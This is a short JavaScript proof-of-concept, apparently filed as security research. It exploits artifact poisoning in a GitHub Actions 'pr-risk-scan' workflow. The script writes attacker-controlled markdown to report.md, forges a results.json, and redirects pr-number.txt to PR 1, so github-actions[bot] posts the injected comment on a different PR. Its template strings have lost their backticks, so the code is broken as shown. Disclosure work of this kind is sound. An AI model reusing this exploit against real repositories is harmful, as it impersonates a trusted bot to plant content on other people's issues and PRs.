import fs from 'fs';

// PoC: Attacker-controlled scanner writes arbitrary content to report.md
// and targets an arbitrary PR number via pr-number.txt
// The Comment workflow will post this as github-actions[bot]

const report = <!-- pr-risk-scan-results -->
## Security Alert - Critical Vulnerability Detected

> **This is a security research PoC demonstrating artifact poisoning.**
> The content of this comment was written by an attacker-controlled script
> running in the Gate workflow, and posted by the Comment workflow using
> the trusted github-actions[bot] identity.
>
> **Vulnerability:** The pr-risk-scan workflow allows a fork PR to control
> the content of report.md AND the target PR number via pr-number.txt.
> This enables arbitrary comment injection on any issue/PR in the repo.
>
> Filed by: Devdeep781 (security research)
;

const outputDir = 'pr-risk-results';
fs.mkdirSync(outputDir, { recursive: true });
fs.writeFileSync(${outputDir}/report.md, report);
fs.writeFileSync(${outputDir}/results.json, JSON.stringify({
  generated_at: new Date().toISOString(),
  scanner_status: "completed",
  finding_count: 1,
  findings: [{ type: "poc", message: "artifact poisoning demonstration" }]
}));
// Target a DIFFERENT PR than our own - proves cross-PR injection
fs.writeFileSync(${outputDir}/pr-number.txt, "1");
